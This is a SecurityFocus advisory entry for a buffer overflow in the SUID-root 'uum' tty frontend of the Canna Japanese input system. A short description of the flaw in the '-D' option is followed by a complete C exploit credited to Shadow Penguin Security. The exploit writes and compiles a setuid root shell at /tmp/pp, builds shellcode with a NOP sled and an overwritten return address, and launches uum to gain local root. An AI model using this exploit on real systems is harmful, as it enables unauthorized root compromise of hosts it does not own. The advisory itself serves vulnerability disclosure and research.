source: http://www.securityfocus.com/bid/757/info

Canna is a Japanese input system available as free software. Canna provides a unified user interface for inputting Japanese.

Canna supports Nemacs(Mule), kinput2 and canuum. All of these tools can be used by a single customization file, romanji-to-kana conversion rules and conversion dictionaries, and input Japanese in the same way.

Canna converts kana to kanji based on a client-server model and supports automatic kana-to-kanji conversion.

The Canna subsystem on certain UNIX versions contains a buffer overflow in the 'uum' program. Uum is a Japanese input tty frontend for Canna. Regrettably, certain versions are vulnerable to a buffer overflow attack via unchecked user supplied data with the '-D' option. Since 'uum' is installed as SUID root this may result in a root level compromise. 

/*=============================================================================
   /usr/bin/uum Exploit for Linux 
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by
    UNYUN     (shadowpenguin@backsection.net)
  =============================================================================
*/
#include <stdlib.h>
#include <stdio.h>

#define RET_ADR  84
#define EXP_ADR  204
#define MAXBUF   300
#define JMP_OFS  0x484
#define NOP      0x90
#define SHELL    "/tmp/pp"
#define COMPILER "gcc"

char exec[60]= 
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff";

char            xx[MAXBUF+1];
unsigned int    i,ip,sp;
FILE            *fp;


unsigned long get_sp(void)
{
__asm__("movl %esp, %eax");
}

main()
{
    strcat(exec,SHELL);
    sprintf(xx,"%s.c",SHELL);
    if ((fp=fopen(xx,"w"))==NULL){
        printf("Can not write to %s\n",xx);
        exit(1);
    }
    fprintf(fp,"main(){setuid(0);setgid(0);system(\"/bin/sh\");}");
    fclose(fp);
    sprintf(xx,"%s %s.c -o %s",COMPILER,SHELL,SHELL);
    system(xx);

    sp=get_sp();
    memset(xx,NOP,MAXBUF);
    ip=sp-JMP_OFS;
    printf("Jumping address = %x\n",ip);
    xx[RET_ADR  ]=ip&0xff;
    xx[RET_ADR+1]=(ip>>8)&0xff;
    xx[RET_ADR+2]=(ip>>16)&0xff;
    xx[RET_ADR+3]=(ip>>24)&0xff;
    strncpy(xx+EXP_ADR,exec,strlen(exec));
    xx[MAXBUF]=0;
    execl("/usr/bin/uum","uum","-D",xx,(char *) 0);
}
